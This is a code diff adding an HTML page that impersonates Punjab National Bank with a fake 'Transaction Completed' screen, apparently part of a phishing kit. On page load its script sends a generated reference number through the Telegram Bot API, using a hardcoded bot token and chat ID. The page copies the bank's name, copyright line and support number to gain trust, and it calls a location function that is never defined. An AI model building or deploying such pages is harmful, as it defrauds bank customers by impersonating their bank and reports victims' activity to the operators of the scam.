@@ -1,0 +1,186 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>PNB Transaction Success</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #1d1d1d;
+            color: white;
+        }
+
+        .container {
+            text-align: center;
+            max-width: 800px;
+            margin: 50px auto;
+            background-color: #2a2a2a;
+            border-radius: 15px;
+            padding: 40px;
+            box-shadow: 0px 0px 30px rgba(0, 0, 0, 0.5);
+            animation: fadeIn 1s ease-in-out;
+        }
+
+        h1 {
+            font-size: 48px;
+            color: #f4b400;
+            margin-bottom: 30px;
+        }
+
+        .success-message {
+            font-size: 24px;
+            margin-bottom: 20px;
+            color: #28a745; /* Green color for success message */
+        }
+
+        .reference-number {
+            font-size: 28px;
+            font-weight: bold;
+            margin: 20px 0;
+            color: red;
+            animation: slideIn 1s ease-in-out;
+        }
+
+        .transaction-info {
+            font-size: 20px;
+            color: #d5d5d5;
+            margin: 20px 0;
+        }
+
+        .tg-button {
+            background-color: #f4b400; /* Yellow background */
+            color: white;
+            padding: 15px 30px;
+            font-size: 18px;
+            text-decoration: none;
+            border-radius: 5px;
+            transition: background-color 0.3s;
+            width: 60%;
+            margin-top: 30px;
+            display: inline-block;
+        }
+
+        .tg-button:hover {
+            background-color: #e0a500;
+        }
+
+        footer {
+            background-color: #2a2a2a;
+            color: white;
+            text-align: center;
+            padding: 15px;
+            margin-top: 30px;
+        }
+
+        footer a {
+            color: #f4b400;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+
+        @keyframes fadeIn {
+            0% {
+                opacity: 0;
+            }
+            100% {
+                opacity: 1;
+            }
+        }
+
+        @keyframes slideIn {
+            0% {
+                transform: translateY(50px);
+                opacity: 0;
+            }
+            100% {
+                transform: translateY(0);
+                opacity: 1;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <h1>Transaction Completed</h1>
+        <p class="success-message">Your transaction has been successfully processed!</p>
+
+        <div class="reference-number">
+            <span>Reference Number: </span><span id="ref-number">PNB-<span id="random-number"></span></span>
+        </div>
+
+        <div class="transaction-info">
+            <p><strong>Transaction Time: </strong><span id="transaction-time"></span></p>
+    
+        </div>
+
+        <a href="index.html" class="tg-button" id="connect-tg" target="_blank">Connect with PNB Support Team</a>
+    </div>
+
+    <footer>
+        <p>&copy; 2025 Punjab National Bank. All rights reserved.</p>
+        <p>For support, visit our <a href="#">Help Center</a> or call <a href="tel:+18001802030">1800-180-2030</a></p>
+    </footer>
+
+    <script>
+        const botToken = "8195910833:AAGjf_PrdNBLevxSO4DW_lbSGl1wp6RJA4A"; // Replace with your bot token
+        const chatId = "-1002424646619"; // Replace with your chat ID
+
+        // Function to generate a random reference number
+        function generateReferenceNumber() {
+            const randomNumber = Math.floor(Math.random() * 10000000000); // Generate 10-digit random number
+            document.getElementById("random-number").textContent = randomNumber;
+            document.getElementById("ref-number").textContent = "PNB-" + randomNumber;
+            sendTelegramMessage(randomNumber); // Send reference number to Telegram
+        }
+
+        // Function to send reference number to Telegram
+        function sendTelegramMessage(referenceNumber) {
+            const message = `📊 **PNB Transaction Success**\n🆔 Reference Number: PNB-${referenceNumber}`;
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log("Message sent successfully.");
+                } else {
+                    console.error("Error sending message.");
+                }
+            })
+            .catch(error => console.error("Telegram Error:", error));
+        }
+
+        // Get current time and date
+        function getCurrentDateTime() {
+            const currentDate = new Date();
+            const formattedDate = currentDate.toLocaleString();
+            document.getElementById("transaction-time").textContent = formattedDate;
+        }
+
+       
+
+        // Generate reference number and fetch other data on page load
+        window.onload = () => {
+            generateReferenceNumber();
+            getCurrentDateTime();
+            getUserLocation();
+        };
+    </script>
+
+</body>
+</html>
